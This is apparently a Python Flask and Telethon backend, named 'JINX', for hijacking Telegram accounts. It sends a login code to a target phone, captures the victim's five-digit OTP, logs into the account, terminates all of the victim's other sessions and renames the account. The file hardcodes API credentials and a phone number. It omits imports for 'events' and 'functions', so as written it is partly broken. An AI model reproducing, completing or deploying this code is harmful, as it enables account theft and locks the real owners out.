from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import nest_asyncio
import os
import json

nest_asyncio.apply()  # FIX THREAD ERROR DI VERCEL

app = Flask(__name__)

# DATA LO
API_ID = 24289127
API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
PHONE = '+6285697919996'
SESSION_STRING = os.environ.get('SESSION_STRING')

# Database
DB_FILE = '/tmp/jinx_db.json'

def save_target(phone, hash_code):
    data = {'phone': phone, 'hash': hash_code, 'otp': None}
    with open(DB_FILE, 'w') as f:
        json.dump(data, f)

def update_otp(otp):
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            data = json.load(f)
        data['otp'] = otp
        with open(DB_FILE, 'w') as f:
            json.dump(data, f)
        return data
    return None

# Client utama
client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# TANGKAP OTP
@client.on(events.NewMessage(chats=PHONE))
async def otp_handler(event):
    if event.message.message.isdigit() and len(event.message.message) == 5:
        otp = event.message.message
        print(f"[JINX] OTP MASUK: {otp}")
        data = update_otp(otp)
        if data:
            await auto_login(data['phone'], data['hash'], otp)

# AUTO LOGIN
async def auto_login(phone, phone_code_hash, otp):
    try:
        target_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await target_client.connect()
        await target_client.sign_in(phone, code=otp, phone_code_hash=phone_code_hash)
        print(f"[JINX] AUTO LOGIN SUKSES: {phone}")
        
        # HAPUS SESSION LAIN
        auths = await target_client(functions.account.GetAuthorizationsRequest())
        for auth in auths.authorizations:
            if not auth.current:
                await target_client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
        
        await target_client(functions.account.UpdateProfileRequest(first_name="Akun Cadangan"))
        print(f"[JINX] AKUN {phone} AMAN!")
    except Exception as e:
        print(f"[JINX] GAGAL: {e}")

# JALANKAN CLIENT DI BACKGROUND
async def start_client():
    await client.connect()
    if not await client.is_user_authorized():
        print("SESSION_STRING RUSAK! BUAT ULANG!")
    await client.run_until_disconnected()

# Background task
import threading
threading.Thread(target=lambda: asyncio.run(start_client()), daemon=True).start()

@app.route('/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone')
    if not phone:
        return jsonify({'success': False, 'error': 'no phone'})
    
    # JALANIN DI LOOP BARU
    async def run():
        try:
            res = await client.send_code_request(phone)
            save_target(phone, res.phone_code_hash)
            return {'success': True, 'hash': res.phone_code_hash}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    try:
        return jsonify(asyncio.get_event_loop().run_until_complete(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/')
def home():
    return "JINX FULL AUTO — NO THREAD ERROR! 😈"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
